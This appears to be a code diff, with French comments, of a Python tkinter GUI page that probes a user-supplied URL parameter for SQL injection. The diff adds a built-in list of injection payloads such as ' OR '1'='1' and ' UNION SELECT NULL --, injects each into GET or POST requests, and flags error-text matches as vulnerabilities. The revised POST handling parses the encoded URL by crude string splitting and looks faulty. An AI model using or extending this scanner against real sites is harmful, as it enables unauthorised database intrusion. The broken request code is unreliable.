@@ -1,6 +1,7 @@
 import tkinter as tk
 from tkinter import messagebox, filedialog, Toplevel
 import requests
+import urllib.parse
 
 class SQLiPage(tk.Frame):
     def __init__(self, parent, controller):
@@ -23,20 +24,22 @@ class SQLiPage(tk.Frame):
         tk.Radiobutton(self, text="GET", variable=self.method_var, value="GET").pack()
         tk.Radiobutton(self, text="POST", variable=self.method_var, value="POST").pack()
 
-        # Paramètre et fichier payloads
+        # Paramètre et champ payloads
         self.param_label = tk.Label(self, text="Nom du paramètre à injecter :")
         self.param_label.pack(pady=5)
         self.param_entry = tk.Entry(self, width=40)
         self.param_entry.pack(pady=5)
 
-        self.payload_label = tk.Label(self, text="Payloads SQL : (ou importer un fichier)")
+        self.payload_label = tk.Label(self, text="Payloads SQL : (séparés par des virgules ou importer un fichier)")
         self.payload_label.pack(pady=5)
+        default_payloads = [
+            "' OR '1'='1'", "' OR 'a'='a'", "' OR 'x'='x'", "1 OR 1=1", "' UNION SELECT NULL --"
+        ]
         self.payload_entry = tk.Entry(self, width=60)
-        self.payload_entry.insert(0, "' OR '1'='1', ' OR 'a'='a'")
+        self.payload_entry.insert(0, ", ".join(default_payloads))
         self.payload_entry.pack(pady=5)
 
-        self.load_payload_button = tk.Button(self, text="Importer un fichier de payloads",
-                                             command=self.load_payload_file)
+        self.load_payload_button = tk.Button(self, text="Importer un fichier de payloads", command=self.load_payload_file)
         self.load_payload_button.pack(pady=5)
 
         # En-têtes HTTP
@@ -93,26 +96,32 @@ class SQLiPage(tk.Frame):
         # Tester chaque payload
         for payload in payloads:
             payload = payload.strip()
-            if self.test_sqli(url, param, payload, method, headers):
-                vulnerabilities.append(payload)
+
+            # N'encoder que la partie du paramètre et du payload, sans couper d'apostrophe
+            full_url = f"{url}?{param}={payload}"  # Construire l'URL complète sans encoder tout
+            encoded_url = urllib.parse.quote(full_url, safe=":/?=&")  # Encoder l'URL mais garder les parties sûres
+            print(f"Requête GET générée : {encoded_url}")  # Debug
+            if self.test_sqli(encoded_url, method, headers):
+                vulnerabilities.append(payload)  # Ajouter le payload détecté comme vulnérable
 
         # Afficher les résultats
         self.show_results(vulnerabilities)
 
-    def test_sqli(self, url, param, payload, method, headers):
+    def test_sqli(self, url, method, headers):
         """Tester un paramètre avec un payload SQLi."""
-        data = {param: payload}  # Paramètre à injecter
         try:
             if method == "GET":
-                response = requests.get(url, params=data, headers=headers)
+                # Requête GET avec l'URL encodée
+                response = requests.get(url, headers=headers)
             else:  # POST
+                data = {url.split('?')[1].split('=')[0]: url.split('=')[1]}
                 response = requests.post(url, data=data, headers=headers)
 
             # Détecter une vulnérabilité
             if "sql" in response.text.lower() or "syntax" in response.text.lower() or "mysql" in response.text.lower():
                 return True
-        except requests.exceptions.RequestException:
-            pass
+        except requests.exceptions.RequestException as e:
+            print(f"Erreur lors de la requête : {e}")
         return False
 
     def show_results(self, vulnerabilities):
